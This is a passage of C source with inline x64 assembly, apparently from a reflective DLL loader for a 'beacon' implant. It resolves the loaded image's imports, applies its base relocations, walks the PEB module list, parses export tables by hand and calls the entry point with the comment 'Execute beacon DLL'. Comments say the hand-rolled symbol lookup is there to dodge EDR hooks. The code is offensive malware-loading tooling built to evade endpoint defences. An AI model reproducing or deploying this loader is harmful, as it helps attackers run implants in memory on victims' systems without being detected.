				// STEP 4 | Import Hint from the modules Hint/Name table
				//     typedef struct _IMAGE_THUNK_DATA64 {
				//       union {
				//     ULONGLONG ForwarderString;
				//     ULONGLONG Function;
				//     ULONGLONG Ordinal;
				//     ULONGLONG AddressOfData;
				//       } u1;
				//     } IMAGE_THUNK_DATA64;
				// importEntryHint = ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal ));
				__asm__(
					"mov rax, %[importLookupTableEntry] \n"
					"mov rax, [rax] \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
					"and eax, 0xFFFF \n" // get rid of the 8
					"mov %[importEntryHint], rax \n"
					:[importEntryHint] "=r" (importEntryHint)
					:[importLookupTableEntry] "r" (importLookupTableEntry)
				);
				// STEP 5 | Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
				// Import Hint from Hint/Name Table (first 2 bytes before the name string)
				// ImportHint - ExportBaseOrdinal = The location of the API/function in the ExportAddressTable entries
				// importEntryExportTableIndex = importEntryHint - importedDllBaseOrdinal;
				__asm__(
					"mov rax, %[importEntryHint] \n"
					"mov r11, %[importedDllBaseOrdinal] \n"
					"sub rax, r11 \n"
					"mov %[importEntryExportTableIndex], rax \n"
					:[importEntryExportTableIndex] "=r" (importEntryExportTableIndex)
					:[importEntryHint] "r" (importEntryHint),
					 [importedDllBaseOrdinal] "r" (importedDllBaseOrdinal)
				);
				// STEP 6 | Get the RVA for our Import Entry executable function address
				// The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
				// importEntryAddressRVA = importEntryExportTableIndex * sizeof(DWORD) + importedDllExportAddressTable;
				__asm__(
					"mov rax, %[importEntryExportTableIndex] \n"
					"mov rcx, %[importedDllExportAddressTable] \n"
					"xor rbx, rbx \n"
					"add bl, 0x4 \n"                  // RBX = sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
					"mul rbx \n"                      // RAX = importEntryExportTableIndex * sizeof(DWORD)
					"add rax, rcx \n"                 // RAX = RVA for our functions address
					"mov %[importEntryAddressRVA], rax \n"          // Save &module.<API> to the variable importEntryAddressRVA
					:[importEntryAddressRVA] "=r" (importEntryAddressRVA)
					:[importEntryExportTableIndex]"r"(importEntryExportTableIndex),
					[importedDllExportAddressTable]"r"(importedDllExportAddressTable)
					
				);
				// STEP 7 | Get the real address for our imported function and write it to our import table
				// patch in the address for this imported function
				// Debugging how this works for the first imported symbol from ws2_32.dll as an example
				// RAX = importEntryAddressRVA = ws2_32.00007FFA5678E500
				// RAX = DEREF_32(importEntryAddressRVA) = 00002320
				// RCX = RAX
				// 	00007FFA5678E500          | 2023
				// 	00007FFA5678E502          | 0000
				// RAX = importAddressTableEntry
				// RDX = ImportedDllAddr = Address=00007FFA56740000 | Page Information=ws2_32.dll
				// RDX = ImportedDllAddr + RAX (00002320)
				// RDX = 00007FFA56742320 <ws2_32.send>
				// DEREF(importAddressTableEntry) = ( ImportedDllAddr + DEREF_32(importEntryAddressRVA) );
				__asm__(
					"mov rax, %[importAddressTableEntry] \n"
					"mov rdx, %[importEntryAddressRVA] \n"
					"mov rcx, %[ImportedDllAddr] \n"
					"xor rbx, rbx \n"
					"mov ebx, [rdx] \n"  // EBX = The RVA for the executable function we are importing
					"add rcx, rbx \n"    // RCX = The executable address within the imported DLL for the function we imported
					"mov [rax], rcx \n"  // write the address of the imported api to our import table
					: // no outputs
					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
					 [importEntryAddressRVA] "r" (importEntryAddressRVA),  // RDX = 00007FFA56740000 &ws2_32.dll
					 [ImportedDllAddr] "r" (ImportedDllAddr) // RCX = ws2_32.00007FFA5678E500
              	);
			}
			else
			{
				// STEP 8 | If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
				// get the VA of this functions import by name struct
				// 00000000001CACA6 = importNameHintEntry
				// HEAP DUMP####
				//		00000000001CACA6 61757472695604FF ÿ.Virtua 
				// 		00000000001CACAE 746365746F72506C lProtect 
				// 		00000000001CACB6 655404CE00007845 Ex..Î.Te 
				//PVOID importNameHintEntry = ( newRdllAddr + DEREF(importAddressTableEntry) ); // First Thunk
				__asm__(
					"mov rax, %[importAddressTableEntry] \n"
					"mov rcx, %[newRdllAddr] \n"
					"xor rbx, rbx \n"
					"mov rbx, [rax] \n" // RVA for our functions Name/Hint table entry
					"add rcx, rbx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
					"add rcx, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
					"mov %[importEntryNameString], rcx \n" // RCX = Address of our Name string for our import
					:[importEntryNameString] "=r" (importEntryNameString) 
					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
					 [newRdllAddr] "r" (newRdllAddr) // RCX 
				);
				// Get the string length for the import function name
				__asm__(
					"mov rax, %[importEntryNameString] \n"
					"xor rcx, rcx \n"
					"stringLengthCounterLoop: \n"
					"inc cl \n" // increment the name string length counter
					"xor rbx, rbx \n"
					"cmp bl, [rax] \n" // are we at the null terminator for the string?
					"je foundStringLength \n"
					"inc rax \n" // move to the next char of the string
					"jmp short stringLengthCounterLoop \n"
					"foundStringLength: \n"
					"mov %[importEntryNameStringLength], rcx \n" 
					:[importEntryNameStringLength] "=r" (importEntryNameStringLength) 
					:[importEntryNameString] "r" (importEntryNameString) 
				);	
				// use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
				importEntryAddress = getSymbolAddress(importEntryNameString, importEntryNameStringLength, ImportedDllAddr, importedDllExportAddressTable, importedDllExportNameTable, importedDllExportOrdinalTable);
				// If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
				if (importEntryAddress == NULL){
					importEntryAddress = (PVOID)pGetProcAddress( (HMODULE)ImportedDllAddr, (LPCSTR)importEntryNameString );
				}

				__asm__(
					"mov rax, %[importAddressTableEntry] \n"
					"mov rdx, %[importEntryAddress] \n"
					"xor rbx, rbx \n"
					"mov [rax], rdx \n"  // write the address of the imported api to our import table
					: // no outputs
					:[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
					 [importEntryAddress] "r" (importEntryAddress) 
                 		);
			}
			// get the next imported function
			importAddressTableEntry += 0x8;
			if( importLookupTableEntry )
				importLookupTableEntry += 0x8;
			__asm__(
				"mov rax, %[importAddressTableEntry] \n" 
				"mov rax, [rax] \n"
				"mov %[checkNullImportAddressTableEntry], rax \n" 
				:[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
				:[importAddressTableEntry] "r" (importAddressTableEntry)
			);
		}
		// get the next import
		// nextModuleImportDescriptor += sizeof( IMAGE_IMPORT_DESCRIPTOR );
		// nextModuleImportDescriptor += 20;
		__asm__(
			"mov rax, %[inNextModuleImportDescriptork] \n"
			"add rax, 0x14 \n" // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
			"mov %[outNextModuleImportDescriptor], rax \n"
			:[outNextModuleImportDescriptor] "=r" (nextModuleImportDescriptor)
			:[inNextModuleImportDescriptork] "r" (nextModuleImportDescriptor)
		);
		// We need to do this again for the next module/DLL in the Import Directory
		// We know we've reached the end of the DLL import entries when we hit a Import descriptor structure that is all 0's
		//   therefor if the struct is all zeros, the name DWORD within that struct will be zeros
		// importNameRVA = IMAGE_IMPORT_DESCRIPTOR->Name 
		// importName = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
		__asm__(
			"mov rax, %[nextModuleImportDescriptor] \n"
			"mov r11, %[newRdllAddr] \n"
			"xor rbx, rbx \n"
			"xor r12, r12 \n"
			"add rax, 0xC  \n" 	     // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
			"mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
			"push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
			"pop r12 \n"             // R12&RBX = RVA of Name DLL
			"cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
			"je check2 \n"
			"add rbx, r11 \n" 		 // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
			"check2: \n"
			"mov %[importNameRVA], r12 \n" 
			"mov %[importName], rbx \n" 
			:[importNameRVA] "=r" (importNameRVA),
			 [importName] "=r" (importName)
			:[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
			 [newRdllAddr] "r" (newRdllAddr)
		);
	}

	// STEP 5: process all of our images relocations...
	PVOID newRdllNewExeHeaderAddr;
	PVOID newRdllOptionalHeaderAddr;
	newRdllNewExeHeaderAddr = getNewExeHeader(newRdllAddr);
	newRdllOptionalHeaderAddr = getOptionalHeader(newRdllNewExeHeaderAddr);
	// calculate the base address delta and perform relocations (even if we load at desired image base)
	PVOID BaseAddressDelta;
	//BaseAddressDelta = newRdllAddr - ((PIMAGE_NT_HEADERS)newRdllNewExeHeaderAddr)->OptionalHeader.ImageBase;
	__asm__(
		"mov rax, %[newRdllOptionalHeaderAddr] \n"
		"mov rcx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x18 \n"
		"add rax, rbx \n"                              // OptionalHeader.ImageBase
		"mov rax, [rax] \n"
		"sub rcx, rax \n"                              // newRdllAddr.ImageBase
		"mov %[BaseAddressDelta], rcx \n"
		:[BaseAddressDelta] "=r" (BaseAddressDelta)
		:[newRdllOptionalHeaderAddr] "r" (newRdllOptionalHeaderAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);
	// newRelocationDirectoryAddr = the address of the base relocation directory from the newRDLL's Optional Header
	// newRelocationDirectoryAddr = (PVOID)&((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
	PVOID newRelocationDirectoryAddr;
	__asm__(
		"mov rax, %[newRdllOptionalHeaderAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x98 \n"            // OptionalHeaderAddr + 0x98 = &DataDirectory[Base Relocation Table]
		"add rax, rbx \n"             // OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
		"mov %[newRelocationDirectoryAddr], rax \n"
		:[newRelocationDirectoryAddr] "=r" (newRelocationDirectoryAddr)
		:[newRdllOptionalHeaderAddr] "r" (newRdllOptionalHeaderAddr)
	);
	// The Relative Virtual Address (Offset from newRDLL base Address) of the Base Relocation Table 
	// newRdllAddr + ((PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->VirtualAddress
	// typedef struct _IMAGE_DATA_DIRECTORY {
	//       DWORD VirtualAddress;
	//       DWORD Size;
	// } IMAGE_DATA_DIRECTORY,*PIMAGE_DATA_DIRECTORY;
	PVOID newRelocationTableAddr;
	__asm__(
		"mov rax, %[newRelocationDirectoryAddr] \n"
		"mov rcx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax] \n"  // Move the 4 byte DWORD Virtual Address of the Relocation Directory table into the EBX register
		"add rcx, rbx \n"    // newRelocationTableAddr = newRdllAddr + RVAnewRelocationTable
		"mov %[newRelocationTableAddr], rcx \n"
		:[newRelocationTableAddr] "=r" (newRelocationTableAddr)
		:[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);
	// The Size of the Base Relocation Table 
	// PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->Size
	PVOID newRelocationDirectorySize;
	__asm__(
		"mov rax, %[newRelocationDirectoryAddr] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD Size of the Relocation Directory table into the EBX register
		"mov %[newRelocationDirectorySize], rbx \n"
		:[newRelocationDirectorySize] "=r" (newRelocationDirectorySize)
		:[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr)
	);
	// check if their are any relocations present

	//if( ((PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->Size )
	if(newRelocationDirectorySize)
	{
		PVOID nextRelocationBlock;
		// newRelocationDirectoryAddr is now the first entry (IMAGE_BASE_RELOCATION)
		//nextRelocationBlock = ( newRdllAddr + ((PIMAGE_DATA_DIRECTORY)newRelocationDirectoryAddr)->VirtualAddress );
		nextRelocationBlock  = newRelocationTableAddr;
		//	typedef struct _IMAGE_BASE_RELOCATION {
		//       DWORD VirtualAddress;
		//       DWORD SizeOfBlock;
		//     } IMAGE_BASE_RELOCATION;
		//     typedef IMAGE_BASE_RELOCATION UNALIGNED *PIMAGE_BASE_RELOCATION;
		// (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
		PVOID relocSizeOfBlock;
		__asm__(
			"mov rax, %[newRelocationTableAddr] \n"
			"xor rbx, rbx \n"
			"mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
			"mov %[relocSizeOfBlock], rbx \n"
			:[relocSizeOfBlock] "=r" (relocSizeOfBlock)
			:[newRelocationTableAddr] "r" (newRelocationTableAddr)
		);
		PVOID relocVirtualAddress;
		PVOID RelocBlockEntries;
		PVOID nextRelocBlockEntryAddress;
		//while( ((PIMAGE_BASE_RELOCATION)nextRelocationBlock)->SizeOfBlock )
		while(relocSizeOfBlock)
		{
			// relocVirtualAddress = the VA for this relocation block
			//relocVirtualAddress = ( newRdllAddr + ((PIMAGE_BASE_RELOCATION)nextRelocationBlock)->VirtualAddress );
			__asm__(
				"mov rax, %[nextRelocationBlock] \n"
				"mov r11, %[newRdllAddr] \n"
				"xor rbx, rbx \n"
				"mov ebx, [rax] \n"   // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress into EBX
				"add r11, rbx \n"     // R11 = &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
				"mov %[relocVirtualAddress], r11 \n"
				:[relocVirtualAddress] "=r" (relocVirtualAddress)
				:[nextRelocationBlock] "r" (nextRelocationBlock),
				 [newRdllAddr] "r" (newRdllAddr)
			);
			// RelocBlockEntries = number of entries in this relocation block
			// 0x8 = this first 8 bytes of the blocks entry list which is the IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
			// 0x2 = each entry is a WORD/2 bytes. first 4 bits are the type (~0xA) and last 12 bits are the offset for the relocation which then needs to be added to the BlockRVA and the VA of RDLL 
			//RelocBlockEntries = ( relocSizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
			// RelocBlockEntries = ( relocSizeOfBlock - 8 ) / 2;
			__asm__(
				"mov rax, %[relocSizeOfBlock] \n"
				"xor rbx, rbx \n"
				"xor rdx, rdx \n"
				"inc bl \n"
				"inc bl \n" // RBX = 0x2 = size of image relocation WORD
				"sub ax, 0x8 \n" // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
				"div bx \n" // RAX/RBX = relocSizeOfBlock/2 = RAX
				"mov %[RelocBlockEntries], rax \n"
				:[RelocBlockEntries] "=r" (RelocBlockEntries)
				:[relocSizeOfBlock] "r" (relocSizeOfBlock)
			);
			// nextRelocBlockEntryAddress is the first entry in the current relocation block
			// nextRelocBlockEntryAddress = nextRelocationBlock + sizeof(IMAGE_BASE_RELOCATION);
			// Add +0x8 to the address of our current RelocationBlock so we are at the first entry within the current RelocationBlock
			__asm__(
				"mov r12, %[nextRelocationBlock] \n"
				"add r12, 0x8 \n"
				"mov %[nextRelocBlockEntryAddress], r12 \n"
				:[nextRelocBlockEntryAddress] "=r" (nextRelocBlockEntryAddress)
				:[nextRelocationBlock] "r" (nextRelocationBlock)
			);

			// we itterate through all the entries in the current block...
			while( RelocBlockEntries-- )
			{
				//*(PVOID *)(relocVirtualAddress + ((PIMAGE_RELOC)nextRelocBlockEntryAddress)->offset) += BaseAddressDelta;
				__asm__(
					"mov rax, %[nextRelocBlockEntryAddress] \n"
					"mov r11, %[relocVirtualAddress] \n"
					"mov r12, %[BaseAddressDelta] \n"
					"xor rbx, rbx \n"
					"mov ax, [rax] \n"   // RAX = the 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
					"shl rax, 0x34 \n"   // only keep the last 12 bits of RAX by shaking the RAX register
					"shr rax, 0x34 \n"   // the last 12 bits is the offset, the first 4 bits is the type
					"add r11, rax \n"    // R11 = the in memory Virtual Address of our current relocation entry
					"mov rbx, [r11] \n"  // RBX = the value of the relocation entry
					"add rbx, r12 \n"    // RBX = The value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
					// Now we need to write our new calculated relocation value to the current relocation entry
					"mov [r11], rbx \n"  // WRITE THAT RELOC!
					: // no outputs
					:[nextRelocBlockEntryAddress] "r" (nextRelocBlockEntryAddress),
					[relocVirtualAddress] "r" (relocVirtualAddress),
					[BaseAddressDelta] "r" (BaseAddressDelta)
               			);
				// get the next entry in the current relocation block
				// nextRelocBlockEntry += sizeof( IMAGE_RELOC );
				__asm__(
                     			"mov r12, %[inNextRelocBlockEntryAddress] \n"
                     			"add r12, 0x2 \n"
                     			"mov %[outNextRelocBlockEntryAddress], r12 \n"
                     			:[outNextRelocBlockEntryAddress] "=r" (nextRelocBlockEntryAddress)
                     			:[inNextRelocBlockEntryAddress] "r" (nextRelocBlockEntryAddress)
                 		);
			}

			// get the next entry in the relocation directory
			// nextRelocationBlock = nextRelocationBlock + relocSizeOfBlock;
			__asm__(
                 		"mov rax, %[inNextRelocationBlock] \n"
                		"mov r11, %[relocSizeOfBlock] \n"
                		"add r11, rax \n"
              			"mov %[outNextRelocationBlock], r11 \n"
             			:[outNextRelocationBlock] "=r" (nextRelocationBlock)
             			:[inNextRelocationBlock] "r" (nextRelocationBlock),
                  		[relocSizeOfBlock] "r" (relocSizeOfBlock)
             		);
			// relocSizeOfBlock = SizeOf(nextRelocationBlock)
			__asm__(
				"mov rax, %[nextRelocationBlock] \n"
				"xor rbx, rbx \n"
				"mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
				"mov %[relocSizeOfBlock], rbx \n"
				:[relocSizeOfBlock] "=r" (relocSizeOfBlock)
				:[nextRelocationBlock] "r" (nextRelocationBlock)
			);
		}
	}

	// STEP 6: call our images entry point
	// the VA of our newly loaded DLL/EXE's entry point
	PVOID newRdllAddrEntryPoint;
	//newRdllAddrEntryPoint = ( newRdllAddr + ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.AddressOfEntryPoint );
	__asm__(
		"mov rax, %[OptionalHeaderAddr] \n"
		"mov rcx, %[newRdllAddr] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x10 \n"
		"add rax, rbx \n"                              // OptionalHeader.AddressOfEntryPoint
		"mov eax, [rax] \n"
		"add rcx, rax \n"                              // newRdllAddr.EntryPoint
		"mov %[newRdllAddrEntryPoint], rcx \n"
		:[newRdllAddrEntryPoint] "=r" (newRdllAddrEntryPoint)
		:[OptionalHeaderAddr] "r" (OptionalHeaderAddr),
		 [newRdllAddr] "r" (newRdllAddr)
	);
	// Flush instruction cache
	pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );
	// Execute beacon DLL
	((DLLMAIN)newRdllAddrEntryPoint)( (HINSTANCE)newRdllAddr, DLL_PROCESS_ATTACH, NULL );
	return newRdllAddrEntryPoint;
}

// Takes in the 4 first for unicode characters (8 bytes) of a DLL and returns the base address of that DLL module if it is already loaded into memory
PVOID crawlLdrDllList(wchar_t * dllName)
{
	PVOID dllBase;
	__asm__(
		"mov r10, %[dllName] \n"
		"xor rcx, rcx \n"             // RCX = 0x0
		"mul rcx \n"                  // RAX&RDX =0x0
	// Check if dllName string is ASCII or Unicode
		"mov rcx, [r10] \n"           // RCX = First 8 bytes of string 
		"cmp ch, al \n"               // Unicode then jump, else change ASCII to Unicode 4 bytes
		"je getMemList \n"
		"movq mm1, rcx \n"            // MMX1 contains first 8 ASCII Chars
		"psllq mm1, 0x20 \n"          // Set MMX1 to unpack first 4 bytes of Unicode string
		"pxor mm2, mm2 \n"            // NULL out MMX2 Register
		"punpckhbw mm1, mm2 \n"       // convert ASCII to Unicode and save first 4 bytes in MMX1
		"movq rcx, mm1 \n"            // RCX = first 4 Unicode chars (8bytes)
	"getMemList:"
		"mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
		"mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
		"mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
		"mov r11, rbx \n" 
	"crawl: \n"
		"mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
		"mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
		"cmp rax, rcx \n"
		"je found \n"
		"mov rbx, [rbx] \n"           // RBX = InMemoryOrderLinks Next Entry
		"cmp r11, [rbx] \n"           // Are we back at the same entry in the list?
		"jne crawl \n"
		"xor rax, rax \n"
		"mov %[dllBase], rax \n"      // DLL is not in InMemoryOrderModuleList, return NULL
		"jmp end \n"
	"found: \n"
		"mov %[dllBase], [rbx+0x20] \n" // [rbx+0x20] = DllBase Address in process memory
	"end: \n"
		:[dllBase] "=r" (dllBase)
		:[dllName] "r" (dllName)
	);
	return dllBase;
}

// Takes in the address of a DLL in memory and returns the DLL's Export Directory Address
PVOID getExportDirectory(PVOID dllBase)
{
	PVOID ExportDirectory;
	__asm__(
		"mov rcx, %[dllBase] \n"
		"mov rbx, rcx \n"
		"mov r8, rcx \n"
		"mov ebx, [rbx+0x3C] \n"
		"add rbx, r8 \n"
		"xor rcx, rcx \n"
		"add cx, 0x88 \n"
		"mov edx, [rbx+rcx] \n"
		"add rdx, r8 \n"
		"mov %[ExportDirectory], rdx \n"
		:[ExportDirectory] "=r" (ExportDirectory)
		:[dllBase] "r" (dllBase)
	);
	return ExportDirectory;
}
// Return the address of the Export Address Table
PVOID getExportAddressTable(PVOID dllBase, PVOID ExportDirectory)
{
	PVOID ExportAddressTable;
	__asm__(
		"mov rcx, %[ExportDirectory] \n"
		"mov rdx, %[dllBase] \n"
		"xor rax, rax \n"
		"add rcx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RCX = &RVAExportAddressTable
		"mov eax, [rcx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
		"add rax, rdx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
		"mov %[ExportAddressTable], rax \n"
		:[ExportAddressTable] "=r" (ExportAddressTable)
		:[ExportDirectory] "r" (ExportDirectory),
		 [dllBase] "r" (dllBase)
	);
	return ExportAddressTable;
}
// Return the address of the Export Name Table
PVOID getExportNameTable(PVOID dllBase, PVOID ExportDirectory)
{
	PVOID ExportNameTable;
	__asm__(
		"mov rcx, %[ExportDirectory] \n"
		"mov rdx, %[dllBase] \n"
		"xor rax, rax \n"
		"add rcx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
		"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
		"add rax, rdx \n"          // RAX = VA ExportAddressOfNames 
		"mov %[ExportNameTable], rax \n"
		:[ExportNameTable] "=r" (ExportNameTable)
		:[ExportDirectory] "r" (ExportDirectory),
		 [dllBase] "r" (dllBase)
	);
	return ExportNameTable;
}
// Return the address of the Export Ordinal Table
PVOID getExportOrdinalTable(PVOID dllBase, PVOID ExportDirectory)
{
	PVOID ExportOrdinalTable;
	__asm__(
		"mov rcx, %[ExportDirectory] \n"
		"mov rdx, %[dllBase] \n"
		"xor rax, rax \n"
		"add rcx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
		"mov eax, [rcx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
		"add rax, rdx \n"          // RAX = VA ExportAddressOfNameOrdinals 
		"mov %[ExportOrdinalTable], rax \n"
		:[ExportOrdinalTable] "=r" (ExportOrdinalTable)
		:[ExportDirectory] "r" (ExportDirectory),
		 [dllBase] "r" (dllBase)
	);
	return ExportOrdinalTable;
}

//Get the DLL NewExeHeader/NTHeader Address
PVOID getNewExeHeader(PVOID dllBase)
{
	PVOID NewExeHeader;
	__asm__(
		"mov rax, %[dllBase] \n"
		"xor rbx, rbx \n"
		"mov ebx, [rax+0x3C] \n"           // RBX = Offset NewEXEHeader
		"add rbx, rax \n"                  // RBX = &module.dll + Offset NewEXEHeader = &NewEXEHeader
		"mov %[NewExeHeader], rbx \n"  // NewExeHeader = ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew
		:[NewExeHeader] "=r" (NewExeHeader)
		:[dllBase] "r" (dllBase)
	);
	return NewExeHeader;
}

// Get the DLL Optional Header Address
PVOID getOptionalHeader(PVOID NewExeHeader)
{
	PVOID OptionalHeader;
	__asm__(
		"mov rax, %[NewExeHeader] \n"
		"add rax, 0x18 \n"
		"mov %[OptionalHeader], rax \n"
		:[OptionalHeader] "=r" (OptionalHeader)
		:[NewExeHeader] "r" (NewExeHeader)
	);
	return OptionalHeader;
}

// Get the DLL Import Directory Address 
PVOID getImportDirectory(PVOID OptionalHeader)
{
	PVOID ImportDirectory;
	__asm__(
		"mov rax, %[OptionalHeader] \n"
		"xor rbx, rbx \n"
		"mov rbx, 0x78 \n"
		"add rax, rbx \n"
		"mov %[ImportDirectory], rax \n"
		:[ImportDirectory] "=r" (ImportDirectory)
		:[OptionalHeader] "r" (OptionalHeader)
	);
	return ImportDirectory;
}
PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
{
	PVOID SymbolAddress;
	__asm__(
		"mov r11, %[dllBase] \n"
		"mov rcx, %[symbolStringSize] \n"
		"mov rdx, %[symbolString] \n"
		"mov r8, %[ExportAddressTable] \n"
		"mov r9, %[ExportNameTable] \n"
		"mov r10, %[ExportOrdinalTable] \n"
		"push rcx \n"
		"xor rax, rax \n"
	"loopFindSymbol: \n"
		"mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
		"xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
		"mov edi, [r9+rax*4] \n"        // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
		"add rdi, r11 \n"               // RDI = &NameString    = RVA NameString + &module.dll
		"mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
		"repe cmpsb \n"                 // Compare strings at RDI & RSI
		"je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
		"inc rax \n"                    // Increment to check if the next name matches
		"jmp short loopFindSymbol \n"   // Jump back to start of loop
	"FoundSymbol: \n"
		"pop rcx \n"                    // Remove string length counter from top of stack
		"mov ax, [r10+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
		"mov eax, [r8+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
		"add rax, r11 \n"               // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
		"sub r10, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
		"jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
		"xor rax, rax \n"               // If forwarder, return 0x0 and exit
	"isNotForwarder: \n"
		"mov %[SymbolAddress], rax \n"  // Save &module.symbol
		:[SymbolAddress] "=r" (SymbolAddress)
		:[symbolStringSize]"r"(symbolStringSize),
		 [symbolString]"r"(symbolString),
		 [dllBase]"r"(dllBase),
		 [ExportAddressTable]"r"(ExportAddressTable),
		 [ExportNameTable]"r"(ExportNameTable),
		 [ExportOrdinalTable]"r"(ExportOrdinalTable)
	);
	return SymbolAddress;
}
